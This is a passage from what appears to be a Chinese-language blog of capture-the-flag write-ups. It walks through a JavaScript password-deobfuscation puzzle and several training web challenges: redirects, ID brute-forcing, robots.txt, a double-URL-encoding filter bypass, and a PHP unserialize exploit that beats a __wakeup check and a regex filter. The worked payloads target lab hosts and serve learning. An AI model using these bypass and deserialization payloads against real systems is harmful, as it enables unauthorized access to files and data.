class="variable">j</span>被赋值为<span class="number">11</span></span><br><span class="line"></span><br><span class="line">(<span class="number">5</span>)第九行此时<span class="variable">n</span>被赋值为<span class="number">0</span>，所以<span class="variable">k</span><span class="operator">=</span><span class="number">11</span><span class="operator">+</span><span class="number">0</span><span class="operator">+</span><span class="number">0</span>，最后等于<span class="number">11</span>    注：这里的(<span class="variable">l</span>)其中是英文字母<span class="variable">l</span>，不是数字<span class="number">1</span></span><br><span class="line"></span><br><span class="line">(<span class="number">6</span>)第十行中，<span class="variable">n</span><span class="operator">=</span><span class="number">18</span></span><br><span class="line"></span><br><span class="line">(<span class="number">7</span>)第一个<span class="keyword">for</span>循环，精简一下代码：</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; <span class="variable">i</span> <span class="operator">&lt;</span> (<span class="number">18</span>); <span class="variable">i</span><span class="operator">+</span><span class="operator">+</span> )</span><br><span class="line">&#123;<span class="variable">o</span> <span class="operator">=</span> <span class="variable">tab</span>[<span class="variable">i</span><span class="operator">-</span><span class="variable">l</span>];<span class="variable">p</span> <span class="operator">+</span><span class="operator">=</span> <span class="title class_">String</span>.<span class="property">fromCharCode</span>((<span class="variable">o</span> <span class="operator">=</span> <span class="variable">tab2</span>[<span class="variable">i</span>]));</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">i</span> <span class="operator">==</span> <span class="number">5</span>)<span class="keyword">break</span>;&#125;</span><br><span class="line">解释：前面的<span class="variable">o</span><span class="operator">=</span><span class="variable">tab</span>[<span class="variable">i</span><span class="number">-1</span>]是无用的，因为后面会被<span class="variable">o</span><span class="operator">=</span><span class="variable">tab2</span>[<span class="variable">i</span>]的值重新覆盖</span><br><span class="line">第一次循环：<span class="variable">o</span><span class="operator">=</span><span class="variable">tab</span>[<span class="number">0</span>];<span class="variable">p</span><span class="operator">=</span><span class="variable">p</span><span class="operator">+</span><span class="title class_">String</span>.<span class="property">fromCharCode</span>((<span class="variable">o</span> <span class="operator">=</span> <span class="variable">tab2</span>[<span class="number">0</span>])</span><br><span class="line"><span class="operator">=</span><span class="operator">&gt;</span><span class="variable">o</span><span class="operator">=</span><span class="number">70</span>;<span class="variable">p</span><span class="operator">=</span><span class="string">&quot;&quot;</span><span class="operator">+</span><span class="title class_">String</span>.<span class="property">fromCharCode</span>(<span class="number">70</span>)<span class="operator">=</span><span class="operator">&gt;</span><span class="variable">p</span><span class="operator">=</span>英文字母<span class="variable">F</span></span><br><span class="line">第二次<span class="operator">...</span></span><br><span class="line">第三次<span class="operator">...</span></span><br><span class="line">第四次<span class="operator">...</span></span><br><span class="line">第五次<span class="operator">...</span></span><br><span class="line">所以，这个<span class="keyword">for</span>循环，最后的<span class="variable">p</span>为（尽管没有输出出来，这里我们知道就好）<span class="variable">FAUX</span> <span class="title function_">P</span></span><br><span class="line"></span><br><span class="line">(<span class="number">8</span>)第二个<span class="keyword">for</span>循环，精简一下代码：</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; <span class="variable">i</span> <span class="operator">&lt;</span> <span class="number">18</span>; <span class="variable">i</span><span class="operator">+</span><span class="operator">+</span> )&#123;</span><br><span class="line"><span class="variable">o</span> <span class="operator">=</span> <span class="variable">tab</span>[<span class="variable">i</span><span class="operator">-</span><span class="variable">l</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">i</span> <span class="operator">&gt;</span> <span class="number">5</span> <span class="operator">&amp;&amp;</span> <span class="variable">i</span> <span class="operator">&lt;</span> <span class="number">17</span>)</span><br><span class="line">        <span class="variable">p</span> <span class="operator">+</span><span class="operator">=</span> <span class="title class_">String</span>.<span class="property">fromCharCode</span>((<span class="variable">o</span> <span class="operator">=</span> <span class="variable">tab2</span>[<span class="variable">i</span>]));</span><br><span class="line">&#125;</span><br><span class="line">解释：这里的<span class="keyword">for</span>循环和上面的差不多，注意这里的<span class="variable">p</span>值由于第一次<span class="keyword">for</span>循环执行后现在已经是<span class="variable">FAUX</span> <span class="variable">P</span>了</span><br><span class="line">加上第一次<span class="keyword">for</span>循环的<span class="variable">p</span>值，最后的<span class="variable">p</span>为<span class="variable">FAUX</span> <span class="variable">PASSWORD</span> <span class="title function_">HAH</span></span><br><span class="line"></span><br><span class="line">(<span class="number">9</span>)<span class="variable">p</span> <span class="operator">+</span><span class="operator">=</span> <span class="title class_">String</span>.<span class="property">fromCharCode</span>(<span class="variable">tab2</span>[<span class="number">17</span>]);</span><br><span class="line">因为<span class="variable">tab2</span><span class="operator">=</span>[<span class="number">70</span>,<span class="number">65</span>,<span class="number">85</span>,<span class="number">88</span>,<span class="number">32</span>,<span class="number">80</span>,<span class="number">65</span>,<span class="number">83</span>,<span class="number">83</span>,<span class="number">87</span>,<span class="number">79</span>,<span class="number">82</span>,<span class="number">68</span>,<span class="number">32</span>,<span class="number">72</span>,<span class="number">65</span>,<span class="number">72</span>,<span class="number">65</span>]</span><br><span class="line">所以：<span class="variable">p</span><span class="operator">=</span><span class="variable">FAUX</span> <span class="variable">PASSWORD</span> <span class="variable">HAH</span> <span class="operator">+</span> <span class="variable">A</span></span><br><span class="line">因此，最后的<span class="variable">p</span>为<span class="variable">FAUX</span> <span class="variable">PASSWORD</span> <span class="title function_">HAHA</span></span><br><span class="line"></span><br><span class="line">(<span class="number">10</span>)<span class="variable">pass</span> <span class="operator">=</span> <span class="variable">p</span>;<span class="keyword">return</span> <span class="variable">pass</span>;</span><br><span class="line"> 即 <span class="variable">pass</span> <span class="operator">=</span> <span class="variable">FAUX</span> <span class="variable">PASSWORD</span> <span class="variable">HAHA</span>;<span class="keyword">return</span> <span class="variable">FAUX</span> <span class="variable">PASSWORD</span> <span class="variable">HAHA</span>;</span><br><span class="line"> 最后函数输出为<span class="variable">FAUX</span> <span class="variable">PASSWORD</span> <span class="variable">HAHA</span></span><br><span class="line"></span><br><span class="line">嗯哼？？？这个函数就执行完了？？？我的<span class="variable">tab</span>数组怎么没有用到？？？，我一开始带进来的参数呢？去哪了？别想了，输出值虽然用到了带进来的参数(就是分割后的<span class="variable">tab</span>数组)，但是<span class="keyword">for</span>循环那里人家直接使用<span class="variable">tab2</span>数组相关代码的值，根本没有用到<span class="variable">tab</span>数组的值，所以由于代码逻辑问题，你传入的<span class="variable">dechiffre</span>的参数<span class="variable">pass_enc</span>是没有任何意义的</span><br><span class="line"></span><br><span class="line">三、<span class="variable">dechiffre</span>函数执行完成后，继续执行其它的代码</span><br><span class="line"><span class="variable">h</span> <span class="operator">=</span> <span class="variable">window</span>.<span class="property">prompt</span>(&#x27;<span class="title class_">Enter</span> <span class="variable">password</span>&#x27;);</span><br><span class="line">    <span class="title function_">alert</span>( <span class="title function_">dechiffre</span>(<span class="variable">h</span>) );</span><br><span class="line"><span class="variable">h</span><span class="operator">=</span>你输入弹框内的内容</span><br><span class="line">之后<span class="variable">alert</span>弹出<span class="title function_">dechiffre</span>(<span class="variable">h</span>)的值，由前面所有的代码可知，代码里<span class="variable">p</span>的值与<span class="variable">tab</span>无关，因为最终都会被<span class="variable">tab2</span>的值替代，所以我们无论输入什么，也就是<span class="variable">pass_enc</span><span class="operator">=</span><span class="variable">h</span>，无论输入的这个<span class="variable">h</span>等于什么，不管<span class="variable">tab</span>能否被分割成字符串数组，是否存在，都只会利用到<span class="variable">tab2</span>。通俗点讲，有关<span class="variable">tab</span>的参数与值都可以视为没有，因此，<span class="variable">pass_enc</span>参数是什么也就没有意义了</span><br><span class="line"></span><br><span class="line">四、最后，结论就是，无论我们在弹框中输入什么值，都只会返回<span class="variable">FAUX</span> <span class="variable">PASSWORD</span> <span class="variable">HAHA</span></span><br><span class="line">我就猜想，会不会<span class="title class_">String</span>[<span class="string">&quot;fromCharCode&quot;</span>](<span class="title function_">dechiffre</span>(<span class="string">&quot;<span class="char escape_">\x35</span><span class="char escape_">\x35</span>\x2c<span class="char escape_">\x35</span><span class="char escape_">\x36</span>\x2c<span class="char escape_">\x35</span><span class="char escape_">\x34</span>\x2c<span class="char escape_">\x37</span><span class="char escape_">\x39</span>\x2c<span class="char escape_">\x31</span><span class="char escape_">\x31</span><span class="char escape_">\x35</span>\x2c<span class="char escape_">\x36</span><span class="char escape_">\x39</span>\x2c<span class="char escape_">\x31</span><span class="char escape_">\x31</span><span class="char escape_">\x34</span>\x2c<span class="char escape_">\x31</span><span class="char escape_">\x31</span><span class="char escape_">\x36</span>\x2c<span class="char escape_">\x31</span><span class="char escape_">\x30</span><span class="char escape_">\x37</span>\x2c<span class="char escape_">\x34</span><span class="char escape_">\x39</span>\x2c<span class="char escape_">\x35</span><span class="char escape_">\x30</span>&quot;</span>));这个语法错误，并且没有没计算出来的是不是最后正确的值，也就是<span class="variable">flag</span><span class="operator">~</span></span><br><span class="line">于是，我不用它这么无论<span class="variable">pass_enc</span>参数输入什么都显示<span class="variable">FAUX</span> <span class="variable">PASSWORD</span> <span class="variable">HAHA</span>的函数，咱也抛弃它一回，自己重新写代码执行它</span><br><span class="line"><span class="operator">&lt;</span><span class="operator">!</span><span class="variable">DOCTYPE</span> <span class="variable">html</span><span class="operator">&gt;</span></span><br><span class="line"><span class="operator">&lt;</span><span class="variable">html</span><span class="operator">&gt;</span></span><br><span class="line"><span class="operator">&lt;</span><span class="variable">head</span><span class="operator">&gt;</span></span><br><span class="line"><span class="operator">&lt;</span><span class="variable">meta</span> <span class="variable">charset</span><span class="operator">=</span><span class="string">&quot;utf-8&quot;</span><span class="operator">&gt;</span></span><br><span class="line"><span class="operator">&lt;</span>/<span class="variable">head</span><span class="operator">&gt;</span></span><br><span class="line"><span class="operator">&lt;</span><span class="variable">body</span><span class="operator">&gt;</span></span><br><span class="line"><span class="operator">&lt;</span><span class="variable">script</span><span class="operator">&gt;</span></span><br><span class="line">    <span class="keyword">var</span> <span class="variable">n</span><span class="operator">=</span><span class="title class_">String</span>.<span class="property">fromCharCode</span>(<span class="number">55</span>,<span class="number">56</span>,<span class="number">54</span>,<span class="number">79</span>,<span class="number">115</span>,<span class="number">69</span>,<span class="number">114</span>,<span class="number">116</span>,<span class="number">107</span>,<span class="number">49</span>,<span class="number">50</span>);</span><br><span class="line">    <span class="variable">document</span>.<span class="property">write</span>(<span class="variable">n</span>);</span><br><span class="line"><span class="operator">&lt;</span>/<span class="variable">script</span><span class="operator">&gt;</span></span><br><span class="line"><span class="operator">&lt;</span>/<span class="variable">body</span><span class="operator">&gt;</span></span><br><span class="line"><span class="operator">&lt;</span>/<span class="variable">html</span><span class="operator">&gt;</span></span><br><span class="line">最后结果为：<span class="number">786</span>OsErtk12</span><br><span class="line">根据提示的<span class="variable">flag</span>格式输入最后的<span class="variable">flag</span>！</span><br></pre></td></tr></table></figure>

<p>注：</p>
<figure class="highlight maxima"><table><tr><td class="code"><pre><span class="line">(<span class="number">1</span>)<span class="built_in">split</span>() 方法用于把一个字符串分割成字符串数组</span><br><span class="line">语法：<span class="built_in">string</span>.<span class="built_in">split</span>(separator,<span class="built_in">limit</span>)</span><br><span class="line">参数                 描述</span><br><span class="line">separator        可选。字符串或正则表达式，从该参数指定的地方分割 <span class="built_in">string</span> Object。比如此题以逗号分割成字符串数组</span><br><span class="line"><span class="built_in">limit</span>            可选。该参数可指定返回的数组的最大长度。如果设置了该参数，返回的子串不会多于这个参数指定的数组。如果没有设置该参数，整个字符串都会被分割，不考虑它的长度。</span><br><span class="line">举例：str=<span class="string">&quot;a,b,c,d,e,f,g&quot;</span>;</span><br><span class="line"><span class="built_in">var</span> 1st = str.<span class="built_in">split</span>(<span class="string">&quot;,&quot;</span>,<span class="number">3</span>);   对str以逗号进行分割，分割后的字符串数组内的值最多只能有<span class="number">3</span>个，结果就是1st = [a,b,c]</span><br><span class="line"></span><br><span class="line">(<span class="number">2</span>)<span class="keyword">for</span> 循环的语法如下：</span><br><span class="line"><span class="keyword">for</span> (语句 <span class="number">1</span>; 语句 <span class="number">2</span>; 语句 <span class="number">3</span>) &#123;</span><br><span class="line">     要执行的代码块</span><br><span class="line">&#125;</span><br><span class="line">语句 <span class="number">1</span> 在循环（代码块）开始之前执行。</span><br><span class="line">语句 <span class="number">2</span> 定义运行循环（代码块）的条件。</span><br><span class="line">语句 <span class="number">3</span> 会在循环（代码块）每次被执行后执行。</span><br><span class="line"></span><br><span class="line">(<span class="number">3</span>)fromCharCode() 可接受一个指定的 Unicode 值，然后返回一个字符串。</span><br><span class="line">语法：String.fromCharCode(n1, n2, ..., nX)</span><br><span class="line">参数                 描述</span><br><span class="line">n1, n2, ..., nX     必需。一个或多个 Unicode 值，即要创建的字符串中的字符的 Unicode 编码。</span><br><span class="line"></span><br><span class="line">(<span class="number">4</span>)<span class="built_in">prompt</span>()方法用于显示可提示用户进行输入的对话框。</span><br><span class="line">这个方法返回用户输入的字符串</span><br><span class="line">语法：<span class="built_in">prompt</span>(msg,defaultText)</span><br><span class="line">参数                描述</span><br><span class="line">msg                可选。要在对话框中显示的纯文本（而不是 HTML 格式的文本）就是弹框显示文本。</span><br><span class="line">defaultText        可选。默认的输入文本，你输入什么弹框一开始出现里面的输入框就会默认显示你这个文本。</span><br><span class="line"></span><br><span class="line">(<span class="number">5</span>)<span class="built_in">var</span> i,j,k,l=<span class="number">0</span>,m,n,o,p = <span class="string">&quot;&quot;</span>;</span><br><span class="line">这个表示声明变量i,j,k,l,m,n,o,p，只有l和p两个变量被赋值了，其它的变量都是不带值的，不带有值的变量，它的值将是undefined，后续代码中可以给它赋值。</span><br><span class="line"></span><br><span class="line">(<span class="number">6</span>)<span class="built_in">length</span></span><br><span class="line"><span class="built_in">length</span> 属性可设置或返回数组中元素的数目。</span><br></pre></td></tr></table></figure>

<h1 id="Web进阶"><a href="#Web进阶" class="headerlink" title="Web进阶"></a>Web进阶</h1><h2 id="1-baby-web"><a href="#1-baby-web" class="headerlink" title="1.baby_web"></a>1.baby_web</h2><h3 id="1-题目描述-11"><a href="#1-题目描述-11" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>想想初始页面是哪个</p>
<h3 id="2-wp-9"><a href="#2-wp-9" class="headerlink" title="2)wp"></a>2)wp</h3><p> 开始界面如下</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220625162533345.png" alt="image-20220625162533345"></p>
<p>没有头绪，但是描述里有首页，再根据url知道这是个php网站</p>
<p>php网站首页文件就是index.php</p>
<p><code>index.php文件是一个php网站首页文件，index是普遍意义上的“首页”，也就是你输入一个域名后会打开一个页面，基本上就是index.xxxx（基本上首页都不会把index.xxxx显示在url里，但也不绝对）</code></p>
<p>试试<code>111.200.241.244:59074/index.php</code></p>
<p>结果又会到1.php，url又变成<code>111.200.241.244:59074/1.php</code></p>
<p>F12打开查看网络</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220625171731934.png" alt="image-20220625171731934"></p>
<p><code>补充：</code></p>
<p> <code>index.php的状态是302什么意思？</code></p>
<p><code>302 Found，原始描述短语为 Moved Temporarily(临时搬家） ，是[HTTP协议](https://baike.baidu.com/item/HTTP协议)中的一个状态码(Status Code)。可以简单的理解为该资源原本确实存在，但已经被**临时**改变了位置；换而言之，就是请求的资源暂时驻留在不同的URI下，故而除非特别指定了缓存头部指示，该状态码不可缓存。</code></p>
<p>发现确实是跳转到了index.php但为什么又回到1.php</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220625171819943.png" alt="image-20220625171819943"></p>
<p>可以看到location:1.php，这就是为什么无法直接访问index.php的原因，但flag已经得到</p>
<p>得到flag</p>
<hr>
<p>如果用burpsuite查看<code>111.200.241.244:59074/index.php</code>，只能看到Flag is hidden!，也算是提示</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220625172122211.png" alt="image-20220625172122211"></p>
<h2 id="2-ics-06"><a href="#2-ics-06" class="headerlink" title="2.ics-06"></a>2.ics-06</h2><h3 id="1-题目描述-12"><a href="#1-题目描述-12" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>云平台报表中心收集了设备管理基础服务的数据，但是数据被删除了，只有一处留下了入侵者的痕迹。</p>
<h3 id="2-wp-10"><a href="#2-wp-10" class="headerlink" title="2)wp"></a>2)wp</h3><p>打开界面有些吓人</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220626084029917.png" alt="image-20220626084029917"></p>
<p>但只有报表中心能打开</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220626084102777.png" alt="image-20220626084102777"></p>
<p>看到url就有思路了，我们可以尝试id爆破</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220626084318243.png" alt="image-20220626084318243"></p>
<p>利用Numbers方式，从1到5000，发现2333处成功爆破</p>
<p>得到flag</p>
<h2 id="3-Training-WWW-Robots"><a href="#3-Training-WWW-Robots" class="headerlink" title="3.Training-WWW-Robots"></a>3.Training-WWW-Robots</h2><h3 id="1-题目描述-13"><a href="#1-题目描述-13" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>无</p>
<h3 id="2-wp-11"><a href="#2-wp-11" class="headerlink" title="2)wp"></a>2)wp</h3><p>这道题和上面新手区的题类似</p>
<p>先访问<code>http://111.200.241.244:51820/robots.txt</code>得到php文件名</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220626090904204.png" alt="image-20220626090904204"></p>
<p>于是访问<code>http://111.200.241.244:51820/fl0g.php/robots.txt</code></p>
<p>得到flag</p>
<h2 id="4-PHP2"><a href="#4-PHP2" class="headerlink" title="4.PHP2"></a>4.PHP2</h2><h3 id="1-题目描述-14"><a href="#1-题目描述-14" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>无</p>
<h3 id="2-wp-12"><a href="#2-wp-12" class="headerlink" title="2)wp"></a>2)wp</h3><p>这句话的意思是”你能证明这个网站存在吗“</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220626104943938.png" alt="image-20220626104943938"></p>
<p>没有思路，抓包，和御剑、dirsearch都没又得到想要的结果</p>
<p>没有办法，搜了一下大佬们的wp</p>
<p>了解到了一个新的知识点phps</p>
<p><code>phps即为PHP Source：phps文件就是php的源代码文件，通常用于提供给用户（访问者）查看php代码，因为用户无法直接通过Web浏览器看到php文件的内容，所以需要用phps文件代替。其实，只要不用php等已经在服务器中注册过的MIME类型为文件即可，但为了国际通用，所以才用了phps文件类型。</code></p>
<p>访问<code>http://111.200.241.244:51703/index.phps</code>，得到源码内容</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220626105416606.png" alt="image-20220626105416606"></p>
<p>右键查看源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&quot;admin&quot;</span>===<span class="variable">$_GET</span>[id]) &#123;</span><br><span class="line">  <span class="keyword">echo</span>(<span class="string">&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_GET</span>[id] = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_GET</span>[id]);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[id] == <span class="string">&quot;admin&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Key: xxxxxxx &lt;/p&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">Can you anthenticate to this website?</span><br></pre></td></tr></table></figure>

<p>根据代码知道，当id&#x3D;admin，输出not allowed!，但是想要输出flag</p>
<p>就需要注意这句语句<code>$_GET[id] = urldecode($_GET[id]);</code></p>
<p><code>urldecode:本函数对字符串进行URL解码。例如通过urlencode编码后的字符串，可通过UrlDecode进行解码。对Url路径加码的函数是UrlEncode  用法相反，和UrlDecode是一致对应的</code></p>
<p>这里我们就清楚了，需要把admin进行url编码，但是只对其进行一次编码，要知道网站本身对url编码就有解码的能力，也就是在urldecode函数执行之前，网站已经把编码解码为admin，从而只输出not allowed!</p>
<p>所以，这里需要对admin进行两次编码，第一被网站解码，绕过第一个if，然后在urldecode函数里进行第二次解码，变成admin，从而输出Key(flag)</p>
<p>于是访问<code>http://111.200.241.244:51703/index.php?id=%25%36%31dmin</code></p>
<p>这里的%25%36%31是字母a的二次url编码由a第一次编码结果%61再次编码而成</p>
<p>–为了payload简洁，一般只编码一个字母</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220626110642311.png" alt="image-20220626110642311"></p>
<p>得到flag</p>
<h2 id="5-Web-python-template-injection"><a href="#5-Web-python-template-injection" class="headerlink" title="5.Web_python_template_injection"></a>5.Web_python_template_injection</h2><p>该题属于ssti，建议先了解一些<a href="../../../../2022/05/28/Web-study">ssti</a>的模板注入，和这两篇文章了解一些flask运行原理</p>
<p><a href="https://www.freebuf.com/column/187845.html">https://www.freebuf.com/column/187845.html</a>  </p>
<p><a href="https://xz.aliyun.com/t/3679">https://xz.aliyun.com/t/3679</a></p>
<p>然后再做这道题</p>
<p><a href="https://blog.csdn.net/Mr_helloword/article/details/107949217">大佬wp</a></p>
<h2 id="6-Web-php-unserialize"><a href="#6-Web-php-unserialize" class="headerlink" title="6.Web_php_unserialize"></a>6.Web_php_unserialize</h2><h3 id="1-题目描述-15"><a href="#1-题目描述-15" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>无</p>
<h3 id="2-wp-13"><a href="#2-wp-13" class="headerlink" title="2)wp"></a>2)wp</h3><p>看名字可知，这是道<a href="../../../../2022/05/28/Web-study">php反序列化</a>类型的题</p>
<p>开始先分析一下php代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123; </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="variable">$file</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @<span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>])) &#123; </span><br><span class="line">    <span class="variable">$var</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>]); </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$var</span>)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;stop hacking!&#x27;</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$var</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&quot;index.php&quot;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><a href="https://blog.csdn.net/yanbai3/article/details/122300480">php代码审计原文链接</a></p>
<p>首先定义了Demo类，在类中定义了几个方法<code>construct()wakeup()destruct()</code>。在这里我们要知道，</p>
<p>php中<u><strong>类实例化的时候，首先运行wakeup()函数</strong></u>，</p>
<p>在<u><strong>序列化时先运行sleep()函数</strong></u>,</p>
<p>在<u><strong>反序列化时先运行wakeup()</strong></u>，</p>
<p>在<u><strong>脚本结束调用destruct()函数</strong></u>。 </p>
<p>继续审计代码，下面的<code>if</code>语句中，先用了<code>base64</code>的解码函数，进行了一次解码，又用一个正则表达式进行过滤，只有<code>base64</code>编码并通过正则表示式才能进行反序列化</p>
<p><img src="https://img-blog.csdnimg.cn/2a59ae6529004d458c4321c9d547fd00.png#pic_center" alt="在这里插入图片描述"></p>
<p>这里的正则表达式<code>’/[oc]:\d+:/i’</code> 表示了<code>以O或者C开头</code>接：接数字，数字至少出现一次或者无数次，忽略大小写，所以我们将<code>O:4改为O:+4</code>则可通过正则表达式，因为在PHP代码里，<code>+4</code>就是<code>4</code>，所以绕过了正则匹配同时也不影响代码正常含义</p>
<p>这里看到了<code>fl4g.php</code>，先把它实例化，这里改一下代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123; </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="variable">$file</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @<span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Demo</span>(<span class="string">&quot;fl4g.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//这里我就在想，如果这个实例化的时候()不加参数，那么最后序列化的结构只能是index.php，也就是源码中的，但是我们的目标是fl4g.php这个文件</span></span><br><span class="line"><span class="comment">//这里其实只需要在实例化类中，传入我们需要序列化的参数即可</span></span><br><span class="line"><span class="comment">//这里相当于给$flie赋值，如果类中多个值需要变成我们需要的参数，用&quot;,&quot;隔开即可，按赋值顺序，例如$a = new Demo(&quot;a&quot;,2,&quot;b&quot;);</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> (<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><a href="https://tool.lu/coderunner/">运行PHP代码</a></p>
<p>得到<code>O:4:&quot;Demo&quot;:1:&#123;s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;&#125;</code></p>
<p>这里看到有一个<code>__wakeup</code>，所以还要改一下属性值<code>1为2</code></p>
<p>–&gt;</p>
<p><code>O:4:&quot;Demo&quot;:2:&#123;s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;&#125;</code></p>
<p><strong>注意：</strong>这里有一个大坑让我卡了好久</p>
<p>先看下面这个图理解一下上面的语句</p>
<p><img src="https://img-blog.csdnimg.cn/740796b022bc4fb3a141a1f116467daf.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5aSn54Gs55m9,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
<p>属性值为10，但是”<code>Demofile</code>“只有8个字符，很明显缺了两个字符，但是却被省略了，猜测确了<strong>两个空字符</strong></p>
<figure class="highlight actionscript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字段的字段名在序列化时，类名和字段名前面都会加上<span class="number">0</span>的前缀。字符串长度也包括所加前缀的长度</span><br><span class="line"></span><br><span class="line">所以也可以推测出Demofile是<span class="keyword">private</span>声明</span><br></pre></td></tr></table></figure>

<p>这里我一直卡住的<u>原因就是把空字符当作了空格</u></p>
<p>所以开始我是直接在D和f前加上空格，但是底下的base64编码提交url没有反应</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220628214059503.png" alt="image-20220628214059503"></p>
<p>然后把decoder换成hex，发现空格是20（44是字母D，66是字母f）</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220628233504338.png" alt="image-20220628233504338"></p>
<p>然后看了下面这个表，明白00才是空字符，空格和空字符不是同一个东西</p>
